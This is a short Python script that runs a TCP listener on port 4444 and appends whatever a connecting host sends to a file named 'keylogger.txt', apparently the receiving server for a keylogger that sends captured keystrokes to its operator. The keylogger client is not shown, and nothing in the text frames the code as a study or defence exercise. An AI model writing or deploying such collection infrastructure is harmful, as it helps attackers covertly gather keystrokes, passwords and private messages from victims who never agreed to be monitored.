import socket
import os

PORT = 4444
HOST = "0.0.0.0"

print(f"Server {HOST} listening on Port: {PORT}")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:

    server.bind((HOST, PORT))

    server.listen(5)

    print("Listening for connection...")
    
    conn, addr = server.accept()

    with conn:

        print(f"Connected from host: {addr[0]} on port {addr[1]}")
        
        while True:

            data = conn.recv(1024)
                    
            decode_msg = data.decode('utf-8')

            try:
                
                with open("keylogger.txt", 'a') as f:

                    f.write(decode_msg)

            except FileNotFoundError:

                print("Make sure the file is present in the current directory")

            if not data:

                break
            conn.sendall(data)


